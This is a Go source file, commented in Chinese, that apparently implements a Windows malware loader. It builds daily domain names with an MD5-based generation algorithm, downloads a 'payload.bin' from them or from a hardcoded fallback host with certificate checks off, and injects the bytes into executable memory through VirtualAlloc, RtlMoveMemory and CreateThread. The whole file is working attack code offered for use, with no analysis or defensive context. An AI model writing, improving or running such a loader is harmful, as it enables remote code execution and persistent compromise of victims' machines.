package main

import (
	"crypto/md5"
	"crypto/tls"
	"encoding/hex"
	"fmt"
	"io"
	"net/http"
	"syscall"
	"time"
	"unsafe"
)

// [配置]
const FallbackPayloadURL = "https://api.cailiu666.xyz/payload.bin"
const DGASeed = "MySecretSeed2024"

var (
	kernel32            = syscall.NewLazyDLL("kernel32.dll")
	ntdll               = syscall.NewLazyDLL("ntdll.dll")
	VirtualAlloc        = kernel32.NewProc("VirtualAlloc")
	RtlMoveMemory       = ntdll.NewProc("RtlMoveMemory")
	CreateThread        = kernel32.NewProc("CreateThread")
	WaitForSingleObject = kernel32.NewProc("WaitForSingleObject")
)
const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
)

// DGA 生成
func generateDGADomains(count int) []string {
	domains := make([]string, 0)
	dateStr := time.Now().Format("2006-01-02")
	for i := 0; i < count; i++ {
		raw := fmt.Sprintf("%s%s%d", dateStr, DGASeed, i)
		hasher := md5.New()
		hasher.Write([]byte(raw))
		hash := hex.EncodeToString(hasher.Sum(nil))
		domain := fmt.Sprintf("https://%s.net", hash[0:12])
		domains = append(domains, domain)
	}
	return domains
}

// 下载函数 (核心修复在这里)
func downloadBytes(url string) ([]byte, error) {
	fmt.Printf("[DGA] 尝试下载: %s ... ", url)
	
	tr := &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}
	
	// [关键修复] 延长超时时间，从 5 秒改为 30 秒
	client := &http.Client{
		Timeout:   30 * time.Second, 
		Transport: tr,
	}

	resp, err := client.Get(url)
	if err != nil {
		fmt.Println("失败 (网络不可达)")
		return nil, err
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		fmt.Printf("失败 (状态码 %d)\n", resp.StatusCode)
		return nil, fmt.Errorf("status %d", resp.StatusCode)
	}

	// 读取 Body (下载文件内容)
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		// 如果在这里出错，很可能就是超时
		fmt.Printf("失败 (%v)\n", err)
		return nil, err
	}

	fmt.Println("成功!")
	return body, nil
}

func main() {
	fmt.Println("======== [Loader: DGA Payload Fetching] ========")
	var shellcode []byte
	var err error

	// 1. DGA 域名下载
	dgaBaseDomains := generateDGADomains(3)
	for _, domain := range dgaBaseDomains {
		downloadURL := domain + "/payload.bin"
		shellcode, err = downloadBytes(downloadURL)
		if err == nil && len(shellcode) > 0 {
			break
		}
	}

	// 2. 保底下载
	if len(shellcode) == 0 {
		fmt.Println("[Fallback] 切换至保底服务器...")
		shellcode, err = downloadBytes(FallbackPayloadURL)
		if err != nil {
			fmt.Printf("[!] 下载彻底失败: %v\n", err)
			time.Sleep(5 * time.Second)
			return
		}
	}

	fmt.Printf("[+] 载荷已就绪: %d 字节\n", len(shellcode))

	// 3. 内存注入
	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	thread, _, _ := CreateThread.Call(0, 0, addr, 0, 0, 0)
	
	fmt.Println("[+] 载荷已注入。Agent 启动。")
	WaitForSingleObject.Call(thread, 0xFFFFFFFF)
}